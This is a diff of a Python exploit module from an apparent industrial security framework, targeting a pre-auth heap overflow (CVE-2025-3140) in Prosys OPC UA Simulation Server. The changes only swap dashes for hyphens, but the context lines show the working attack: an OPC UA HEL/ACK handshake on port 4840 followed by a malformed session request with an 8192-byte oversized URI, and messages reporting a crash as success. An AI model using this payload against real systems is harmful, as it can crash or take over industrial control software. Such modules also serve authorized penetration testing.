@@ -1,4 +1,4 @@
-"""IndustrialXPL CVE Module — CVE-2025-3140 (Prosys OPC UA Simulation Server Pre-Auth RCE).
+"""IndustrialXPL CVE Module - CVE-2025-3140 (Prosys OPC UA Simulation Server Pre-Auth RCE).
 
 Pre-authentication remote code execution in Prosys OPC UA Simulation Server
 via a crafted OPC UA service request. The server improperly handles
@@ -17,7 +17,7 @@ from industrialxpl.core.exploit import (
 
 class Exploit(Exploit):
     __info__ = {
-        "name":             "CVE-2025-3140 — Prosys OPC UA Simulation Server Pre-Auth RCE",
+        "name":             "CVE-2025-3140 - Prosys OPC UA Simulation Server Pre-Auth RCE",
         "description":      "Pre-auth heap corruption via malformed OPC UA CreateSession in Prosys OPC UA Simulation Server. CVSS 9.8. No auth required.",
         "authors":          ("Andre Henrique (@mrhenrike) | Uniao Geek",),
         "references":       (
@@ -48,7 +48,7 @@ class Exploit(Exploit):
         0x00,0x00,0x00,0x00,  # max chunk count
     ])
 
-    # Malformed CreateSession — oversized application URI (triggers heap overflow)
+    # Malformed CreateSession - oversized application URI (triggers heap overflow)
     _OVERSIZED_URI = b"opc.tcp://" + b"A" * 8192 + b":4840"
 
     @mute
@@ -72,7 +72,7 @@ class Exploit(Exploit):
         if self.simulate:
             DestructiveGate.print_simulation(
                 description=(
-                    "CVE-2025-3140 — Prosys OPC UA Simulation Server Pre-Auth RCE\n"
+                    "CVE-2025-3140 - Prosys OPC UA Simulation Server Pre-Auth RCE\n"
                     "CVSS 9.8 | No authentication required | Port 4840\n\n"
                     "Step 1: TCP connect to port 4840\n"
                     "Step 2: Send OPC-UA HEL (Hello) → receive ACK\n"
@@ -97,7 +97,7 @@ class Exploit(Exploit):
                 print_warning(f"[CVE-2025-3140] Expected ACK, got: {ack[:8].hex()}")
                 s.close()
                 return
-            print_status("[CVE-2025-3140] HEL/ACK exchange OK — sending malformed CreateSession ...")
+            print_status("[CVE-2025-3140] HEL/ACK exchange OK - sending malformed CreateSession ...")
             # Malformed OPN with oversized URI
             uri_len = struct.pack("<I", len(self._OVERSIZED_URI))
             opn_body = uri_len + self._OVERSIZED_URI
@@ -106,10 +106,10 @@ class Exploit(Exploit):
             resp = s.recv(128)
             s.close()
             if not resp:
-                print_success("[CVE-2025-3140] Server crashed — heap overflow triggered! (no response)")
+                print_success("[CVE-2025-3140] Server crashed - heap overflow triggered! (no response)")
             else:
-                print_info(f"[CVE-2025-3140] Response: {resp[:32].hex()} — may be patched")
+                print_info(f"[CVE-2025-3140] Response: {resp[:32].hex()} - may be patched")
         except ConnectionResetError:
-            print_success("[CVE-2025-3140] Connection reset by server — crash/RCE likely triggered!")
+            print_success("[CVE-2025-3140] Connection reset by server - crash/RCE likely triggered!")
         except Exception as e:
             print_error(f"[CVE-2025-3140] {e}")
